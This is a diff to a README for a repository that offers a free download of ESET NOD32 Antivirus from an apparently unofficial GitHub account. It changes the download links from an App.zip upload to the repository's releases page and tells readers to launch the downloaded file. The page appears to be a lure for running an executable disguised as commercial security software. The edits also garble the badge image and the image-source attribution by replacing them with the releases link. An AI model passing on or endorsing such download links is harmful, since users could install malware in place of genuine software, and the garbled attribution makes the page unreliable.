@@ -44,7 +44,7 @@ The topics covered in this repository include:
 
 ## Get Started
 
-To download the latest version of ESET NOD32 Antivirus, click [here](https://github.com/uploads/App.zip).
+To download the latest version of ESET NOD32 Antivirus, click [here](https://github.com/Parraga3241/ESET-NOD32-Antivirus-Free/releases).
 
 *Note: The link provided is a direct download link for the ESET NOD32 Antivirus installation file. Please launch the file to begin the installation process.*
 
@@ -52,12 +52,12 @@ If the link is not working or you need more options, please check the "Releases"
 
 ## Shield
 
-[![Download ESET NOD32 Antivirus](https://img.shields.io/badge/Download-ESET%20NOD32%20Antivirus-blue)](https://github.com/uploads/App.zip)
+[![Download ESET NOD32 Antivirus](https://github.com/Parraga3241/ESET-NOD32-Antivirus-Free/releases%20NOD32%20Antivirus-blue)](https://github.com/Parraga3241/ESET-NOD32-Antivirus-Free/releases)
 
 ## Conclusion
 
 ESET NOD32 Antivirus is the ultimate solution to protect your computer from malicious threats and ensure a safe online experience. With its advanced features and regular updates, you can trust ESET NOD32 Antivirus to keep your digital life secure. Explore the resources in this repository to make the most out of your antivirus software and stay one step ahead of cyber threats. Stay safe, stay protected with ESET NOD32 Antivirus! 🛡️🔒
 
-![ESET NOD32 Antivirus](https://imageurl.com)
+![ESET NOD32 Antivirus](https://github.com/Parraga3241/ESET-NOD32-Antivirus-Free/releases)
 
-*Image Source: ESET.com*
+*Image Source: https://github.com/Parraga3241/ESET-NOD32-Antivirus-Free/releases*
